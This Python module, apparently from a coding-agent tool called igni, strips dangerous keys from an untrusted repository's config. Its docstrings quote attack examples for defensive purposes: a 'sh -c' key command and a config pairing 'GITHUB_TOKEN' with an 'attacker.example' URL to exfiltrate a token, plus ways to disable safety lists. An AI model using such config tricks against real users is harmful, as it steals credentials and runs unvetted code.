"""A repository's settings files, less what a repository may not set.

A project's ``.igni/config.yaml`` arrives with the repository: anyone who can
commit to it writes it. So some keys it may never set, some only once the
person has trusted the folder (``core/workspace_trust``), and a model's key
sources and endpoint are watched so an untrusted repository can neither run
a program for a key nor send the person's own key to a host it chose.
"""

from __future__ import annotations

import logging
from collections.abc import Callable
from pathlib import Path
from typing import Any, ClassVar

from pydantic import BaseModel, ConfigDict

from igni_core.core.config.accumulator import SettingsAccumulator
from igni_core.core.config.managed_policy import ManagedPolicySource
from igni_core.core.config.tiers.files import JsonFragmentTier, YamlTier
from igni_core.core.config.tiers.raw_model_registry import RawModelRegistry

logger = logging.getLogger(__name__)


class RefusedKeys(BaseModel):
    """Keys a project file may not set, and why — said in the warning."""

    model_config = ConfigDict(frozen=True)

    #: Top-level keys; a dotted key is one field inside a block.
    keys: tuple[str, ...]
    #: Finishes "``<file>`` sets ``<keys>``, which …".
    why: str

    def strip(self, payload: dict[str, Any], *, source: Path) -> dict[str, Any]:
        """``payload`` less :attr:`keys`, with a warning naming the ones it set."""
        refused: list[str] = []
        for key in self.keys:
            block, _, field = key.partition(".")
            if not field:
                if key in payload:
                    refused.append(key)
                    payload = {k: v for k, v in payload.items() if k != key}
            elif isinstance(payload.get(block), dict) and field in payload[block]:
                refused.append(key)
                payload = {
                    **payload,
                    block: {k: v for k, v in payload[block].items() if k != field},
                }
        if refused:
            logger.warning("%s sets %s, which %s; ignored.", source, ", ".join(refused), self.why)
        return payload


#: Keys a repository may not set. A repository's config is whoever wrote the
#: repository, so it may neither switch air-gapped mode off, name a host igni
#: would then treat as inside the network, nor move ``storage.data_dir`` — the
#: organisation's group policy is read from under it, so moving it would hide
#: the policy or plant a forged one. ``network`` says which hosts an
#: air-gapped igni may reach; it comes from the user's file, the group policy
#: or the managed file.
NOT_FROM_A_PROJECT = RefusedKeys(
    keys=(
        "storage.data_dir",
        "network",
        "air_gapped",
        "api_url",
        "portal_url",
        "update_endpoint",
        "plugins.marketplaces",
    ),
    why="only user, group or managed settings may set",
)

#: Further keys a project may set only once the folder is trusted
#: (``core/workspace_trust``): its permission rules and mode, and the safety
#: lists and Bypass guard. An untrusted repository could otherwise empty
#: ``safety.blocked_commands``, ``allow: [Bash]`` or start in
#: ``bypassPermissions`` for whoever opens it.
ONLY_WHEN_TRUSTED = RefusedKeys(
    keys=("permissions", "safety"),
    why="a project may set only once you trust the folder (igni trust)",
)


class ProjectYamlTier(YamlTier):
    """A project's YAML file, less the keys a repository may not set."""

    NOT_FROM_A_PROJECT: ClassVar[RefusedKeys] = NOT_FROM_A_PROJECT
    ONLY_WHEN_TRUSTED: ClassVar[RefusedKeys] = ONLY_WHEN_TRUSTED

    #: A model entry's fields that fetch or hold its key.
    KEY_FIELDS: ClassVar[tuple[str, ...]] = ("api_key", "api_key_env", "api_key_cmd")
    #: A model entry's fields that say where its requests go.
    ENDPOINT_FIELDS: ClassVar[tuple[str, ...]] = ("url", "provider")
    #: Key sources an untrusted folder may not use (see :meth:`_without_key_sources`).
    UNTRUSTED_KEY_SOURCES: ClassVar[tuple[str, ...]] = ("api_key_cmd", "api_key_env")

    def __init__(self, path: Path, *, trusted: Callable[[], bool] | None = None) -> None:
        super().__init__(path)
        #: Asked at :meth:`apply` time; ``None`` means trusted (direct
        #: construction in tests and tooling, which predates trust).
        self._trusted = trusted

    def apply(self, accumulator: SettingsAccumulator) -> SettingsAccumulator:
        path = self._source.path
        payload = self.NOT_FROM_A_PROJECT.strip(dict(self._source.load()), source=path)
        if self._trusted is not None and payload and not self._trusted():
            payload = self.ONLY_WHEN_TRUSTED.strip(payload, source=path)
            payload = self._without_key_sources(payload)
            return self._without_borrowed_keys(accumulator, payload)
        return accumulator.merge(payload)

    def _without_key_sources(self, payload: dict[str, Any]) -> dict[str, Any]:
        """``payload`` less each model's ``api_key_cmd`` and ``api_key_env``, for an untrusted folder.

        ``api_key_cmd`` is a program igni runs to fetch a key when it builds
        the model. From a repository nobody has trusted yet it is the
        repository's code, run by opening it: ``api_key_cmd: sh -c '…'`` in
        a cloned ``.igni/config.yaml``. Found by the bandit lint (S603).

        ``api_key_env`` runs nothing, but it reads any variable of the
        person's environment and sends it, as the key, to the entry's
        ``url`` — which the same file names: ``api_key_env: GITHUB_TOKEN``
        and ``url: https://attacker.example/v1`` (B28). Both wait until the
        folder is trusted. A literal ``api_key`` is the repository's own
        string, nobody else's secret, so it stays.
        """
        registry = RawModelRegistry.of(payload)
        if registry is None:
            return payload
        refused = registry.rows_setting(self.UNTRUSTED_KEY_SOURCES)
        if not refused:
            return payload
        logger.warning(
            "%s sets %s; a project's api_key_cmd runs a program and its api_key_env "
            "sends a variable of your environment to the URL it names, so they are "
            "ignored until you trust the folder (igni trust).",
            self._source.path,
            ", ".join(f"{', '.join(keys)} for {name}" for name, keys in sorted(refused.items())),
        )
        return registry.without(refused).into(payload)

    def _without_borrowed_keys(
        self, accumulator: SettingsAccumulator, payload: dict[str, Any]
    ) -> SettingsAccumulator:
        """Merge an untrusted ``payload``; a model it re-points keeps no key from below.

        The merge is deep, so a project entry that sets only ``url`` for a
        model the person's own config defines kept that config's
        ``api_key`` (or ``api_key_env``, ``api_key_cmd``, ``cloud_token``)
        and sent it to the project's host (B28). When an untrusted project
        changes where a model's requests go, the entry's key comes from
        the project or from nowhere.
        """
        merged = accumulator.merge(payload)
        project = RawModelRegistry.of(payload)
        below = RawModelRegistry.of(accumulator.payload)
        result = RawModelRegistry.of(merged.payload)
        if project is None or below is None or result is None:
            return merged
        borrowed: dict[str, list[str]] = {}
        for name, entry in project.rows().items():
            lower = below.row(name)
            if lower is None:
                continue
            repointed = any(f in entry and entry[f] != lower.get(f) for f in self.ENDPOINT_FIELDS)
            inherited = [k for k in self.KEY_FIELDS if k in lower and k not in entry]
            if repointed and inherited:
                borrowed[name] = inherited
        if not borrowed:
            return merged
        logger.warning(
            "%s points %s at a different endpoint; the key your own config gives "
            "%s is not sent there. Trust the folder (igni trust) to allow it.",
            self._source.path,
            ", ".join(sorted(borrowed)),
            "it" if len(borrowed) == 1 else "them",
        )
        return SettingsAccumulator(payload=result.without(borrowed).into(merged.payload))


class ProjectJsonFragmentTier(JsonFragmentTier):
    """A project's ``settings.json`` / ``settings.local.json``.

    The lifted keys are ``permissions`` only, so an untrusted folder's file
    contributes nothing: see :data:`ONLY_WHEN_TRUSTED`.
    """

    def __init__(self, path: Path, *, trusted: Callable[[], bool] | None = None) -> None:
        super().__init__(path)
        self._trusted = trusted

    def apply(self, accumulator: SettingsAccumulator) -> SettingsAccumulator:
        result = ManagedPolicySource.load_json_fragment(self._path)
        if not (result.ok and result.data):
            return accumulator
        payload = dict(result.data)
        if self._trusted is not None and not self._trusted():
            payload = ONLY_WHEN_TRUSTED.strip(payload, source=self._path)
        return accumulator.merge(payload) if payload else accumulator
